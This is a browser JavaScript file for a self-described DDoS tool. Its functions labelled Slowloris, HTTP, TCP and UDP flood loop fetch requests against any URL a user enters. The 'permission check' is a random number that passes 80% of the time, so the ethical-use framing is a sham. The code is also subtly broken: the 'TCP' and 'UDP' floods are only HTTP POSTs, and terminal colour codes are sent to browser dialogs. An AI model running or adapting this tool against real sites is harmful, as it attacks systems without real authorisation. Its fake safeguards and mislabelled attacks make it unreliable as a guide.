// Red and Black color scheme (using ANSI escape codes for terminal output)
const RED = "\x1b[31m";
const BLACK = "\x1b[30m";
const RESET = "\x1b[0m"; // Reset color to default

// Configuration
const MAX_DDOS_DURATION = 60; // Maximum allowed duration for DDoS simulation (seconds)
const REQUEST_INTERVAL = 5000; // Interval between requests in milliseconds (rate limiting)
const SAFE_MODE_TARGET = 'http://localhost'; // Target used in safe mode
let isSafeMode = false; // Flag to indicate if safe mode is enabled

// Log function
function log(message) {
    const timestamp = new Date().toISOString();
    console.log(`${BLACK}[${timestamp}] ${message}${RESET}`); // Black text on default background
}

// Function to check if the user has provided explicit consent
async function getUserConsent() {
    return new Promise((resolve) => {
        const consent = confirm(RED + "I understand and agree to use this tool for ethical security testing ONLY." + RESET);
        resolve(consent);
    });
}

// Function to verify permissions before taking action
async function verifyPermissions(target) {
    // Implement your permission verification logic here.
    // This could involve checking user roles, API keys, etc.
    log("Verifying permissions for target: " + target);

    // Check if the target is a valid URL
    if (!isValidURL(target)) {
        log(RED + "Invalid target URL." + RESET);
        alert(RED + "Invalid target URL. Please provide a valid URL." + RESET);
        return false;
    }

    // Example: Placeholder logic - replace with actual permission checks
    const hasPermissions = Math.random() < 0.8; // Simulate success 80% of the time

    if (hasPermissions) {
        log(RED + "Permissions verified." + RESET);
        return true;
    } else {
        log(RED + "Insufficient permissions." + RESET);
        alert(RED + "Insufficient permissions to perform this action." + RESET);
        return false;
    }
}

// Function to validate a URL
function isValidURL(str) {
    try {
        new URL(str);
        return true;
    } catch (_) {
        return false;
    }
}

// Function to simulate a "low and slow" DoS attack (for demonstration/testing)
async function lowAndSlowDoS(target, durationSeconds) {
    log(RED + "Starting Low and Slow DoS attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);

    if (durationSeconds > MAX_DDOS_DURATION) {
        log(RED + "Duration exceeds maximum allowed limit." + RESET);
        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
        return;
    }

    if (!await verifyPermissions(target)) {
        return;
    }

    const startTime = Date.now();
    let endTime = startTime + (durationSeconds * 1000);

    while (Date.now() < endTime) {
        try {
            // Simulate sending a slow, incomplete request
            log("Sending slow request to: " + target); // Removed sensitive target details in log.
             fetch(target, {
                  method: 'POST',
                  body: 'This is a slow request...',
                  keepalive: true,
                  mode: 'no-cors' //To allow requests to other domains
             })
             .then(response => {
                 log(`Response received: ${response.status}`);
             })
             .catch(error => {
                 log(RED + "Error sending request: " + error + RESET);
             });

            //Delay to simulate slowness.
            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
        } catch (error) {
            log(RED + "Error during attack: " + error + RESET);
        }
    }

    log(RED + "Low and Slow DoS attack simulation COMPLETED." + RESET);
}


// Function to toggle safe mode
function toggleSafeMode() {
    isSafeMode = !isSafeMode;
    log(RED + "Safe mode " + (isSafeMode ? "ENABLED" : "DISABLED") + RESET);
    alert(RED + "Safe mode " + (isSafeMode ? "ENABLED" : "DISABLED") + RESET);
}

// Function to add a TCP flood attack
async function tcpFlood(target, durationSeconds) {
    log(RED + "Starting TCP Flood attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);

    if (durationSeconds > MAX_DDOS_DURATION) {
        log(RED + "Duration exceeds maximum allowed limit." + RESET);
        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
        return;
    }

    if (!await verifyPermissions(target)) {
        return;
    }

    const startTime = Date.now();
    let endTime = startTime + (durationSeconds * 1000);

    while (Date.now() < endTime) {
        try {
            // Simulate sending a TCP packet
            log("Sending TCP packet to: " + target);
            fetch(target, {
                method: 'POST',
                body: 'SYN',
                keepalive: true,
                mode: 'no-cors' //To allow requests to other domains
            })
                .then(response => {
                    log(`Response received: ${response.status}`);
                })
                .catch(error => {
                    log(RED + "Error sending request: " + error + RESET);
                });
            //Delay to simulate slowness.
            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
        } catch (error) {
            log(RED + "Error during attack: " + error + RESET);
        }
    }

    log(RED + "TCP Flood attack simulation COMPLETED." + RESET);
}

// Function to add a UDP flood attack
async function udpFlood(target, durationSeconds) {
    log(RED + "Starting UDP Flood attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);

    if (durationSeconds > MAX_DDOS_DURATION) {
        log(RED + "Duration exceeds maximum allowed limit." + RESET);
        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
        return;
    }

    if (!await verifyPermissions(target)) {
        return;
    }

    const startTime = Date.now();
    let endTime = startTime + (durationSeconds * 1000);

    while (Date.now() < endTime) {
        try {
            // Simulate sending a UDP packet
            log("Sending UDP packet to: " + target);
            fetch(target, {
                method: 'POST',
                body: 'Random Data',
                keepalive: true,
                mode: 'no-cors' //To allow requests to other domains
            })
                .then(response => {
                    log(`Response received: ${response.status}`);
                })
                .catch(error => {
                    log(RED + "Error sending request: " + error + RESET);
                });

            //Delay to simulate slowness.
            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
        } catch (error) {
            log(RED + "Error during attack: " + error + RESET);
        }
    }

    log(RED + "UDP Flood attack simulation COMPLETED." + RESET);
}

// Function to add a HTTP flood attack
async function httpFlood(target, durationSeconds) {
    log(RED + "Starting HTTP Flood attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);

    if (durationSeconds > MAX_DDOS_DURATION) {
        log(RED + "Duration exceeds maximum allowed limit." + RESET);
        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
        return;
    }

    if (!await verifyPermissions(target)) {
        return;
    }

    const startTime = Date.now();
    let endTime = startTime + (durationSeconds * 1000);

    while (Date.now() < endTime) {
        try {
            // Simulate sending an HTTP request
            log("Sending HTTP request to: " + target);
            fetch(target, {
                method: 'GET',
                keepalive: true,
                mode: 'no-cors' //To allow requests to other domains
            })
                .then(response => {
                    log(`Response received: ${response.status}`);
                })
                .catch(error => {
                    log(RED + "Error sending request: " + error + RESET);
                });

            //Delay to simulate slowness.
            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
        } catch (error) {
            log(RED + "Error during attack: " + error + RESET);
        }
    }

    log(RED + "HTTP Flood attack simulation COMPLETED." + RESET);
}

// Function to add a Slowloris attack
async function slowloris(target, durationSeconds) {
    log(RED + "Starting Slowloris attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);

    if (durationSeconds > MAX_DDOS_DURATION) {
        log(RED + "Duration exceeds maximum allowed limit." + RESET);
        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
        return;
    }

    if (!await verifyPermissions(target)) {
        return;
    }

    const startTime = Date.now();
    let endTime = startTime + (durationSeconds * 1000);

    while (Date.now() < endTime) {
        try {
            // Simulate sending an incomplete HTTP request
            log("Sending incomplete HTTP request to: " + target);
            fetch(target, {
                method: 'GET',
                headers: {
                    'X-Slowloris': 'StillProcessing...'
                },
                keepalive: true,
                mode: 'no-cors' //To allow requests to other domains
            })
                .then(response => {
                    log(`Response received: ${response.status}`);
                })
                .catch(error => {
                    log(RED + "Error sending request: " + error + RESET);
                });

            //Delay to simulate slowness.
            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
        } catch (error) {
            log(RED + "Error during attack: " + error + RESET);
        }
    }

    log(RED + "Slowloris attack simulation COMPLETED." + RESET);
}


// Main execution function (call this from your HTML button)
async function startDDoS(target, duration, attackType) {
    if (!target || !duration || !attackType) {
        alert(RED + "Please provide a valid target, duration, and attack type." + RESET);
        return;
    }

    // Use safe mode target if safe mode is enabled
    const actualTarget = isSafeMode ? SAFE_MODE_TARGET : target;

    if (await getUserConsent()) {
        log(RED + "User consent granted. Starting attack..." + RESET);

        switch (attackType) {
            case 'lowAndSlow':
                lowAndSlowDoS(actualTarget, duration);
                break;
            case 'tcpFlood':
                tcpFlood(actualTarget, duration);
                break;
            case 'udpFlood':
                udpFlood(actualTarget, duration);
                break;
            case 'httpFlood':
                httpFlood(actualTarget, duration);
                break;
            case 'slowloris':
                slowloris(actualTarget, duration);
                break;
            default:
                alert(RED + "Invalid attack type." + RESET);
                break;
        }
    } else {
        log(RED + "User consent denied. Attack aborted." + RESET);
        alert(RED + "Attack aborted due to lack of consent." + RESET);
    }
}


//Expose the functions to the window object so it can be called from HTML
window.startDDoS = startDDoS;
window.toggleSafeMode = toggleSafeMode;